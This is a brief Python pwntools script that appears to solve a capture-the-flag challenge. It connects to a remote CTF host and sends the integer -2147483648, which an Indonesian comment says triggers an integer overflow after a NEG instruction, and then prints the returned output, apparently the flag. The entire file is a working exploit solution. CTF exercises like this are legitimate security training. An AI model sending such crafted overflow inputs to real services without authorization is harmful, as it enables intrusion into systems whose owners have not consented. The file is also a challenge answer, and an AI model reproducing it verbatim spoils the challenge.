from pwn import *

# Context setup
context.log_level = 'error'
HOST = 'oq7qaruz5vsw.boroctf.com'
PORT = 25287

def solve():
    io = remote(HOST, PORT)
    
    # INT_MIN untuk memicu integer overflow pasca instruksi NEG
    payload = b"-2147483648"
    
    io.sendlineafter(b"What number will you contribute?", payload)
    
    # Ambil flag dari output
    output = io.recvall().decode()
    print(output.strip())

if __name__ == "__main__":
    solve()
